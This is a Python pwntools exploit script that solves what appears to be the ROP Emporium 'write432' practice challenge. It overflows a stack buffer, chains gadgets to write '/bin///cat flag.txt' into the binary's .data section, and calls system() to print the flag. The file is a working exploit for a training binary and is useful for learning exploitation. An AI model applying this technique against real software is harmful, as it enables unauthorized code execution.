#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def main():
    context(arch="i386", os="linux", endian="little")
    e = ELF("./write432")
    rop = ROP([e])

    pop_pop = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
    mov = 0x08048670                                            # mov [edi], ebp
    data = get_section_addr(e, '.data')
    system = e.plt['system']
    string = "/bin///cat flag.txt" + "\x00"
    padding = "A" * 44

    rop.raw(p32(pop_pop) + p32(data) + string[:4])
    rop.raw(p32(mov))
    rop.raw(p32(pop_pop) + p32(data + 4) + string[4:8])
    rop.raw(p32(mov))
    rop.raw(p32(pop_pop) + p32(data + 8) + string[8:12])
    rop.raw(p32(mov))
    rop.raw(p32(pop_pop) + p32(data + 12) + string[12:16])
    rop.raw(p32(mov))
    rop.raw(p32(pop_pop) + p32(data + 16) + string[16:20])
    rop.raw(p32(mov))
    rop.raw(p32(system) + p32(system) + p32(data))

    p = process(['./write432'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(padding + str(rop))
    msg = p.recvuntil('}')
    print msg

    p.close()


if __name__ == "__main__":
    main()
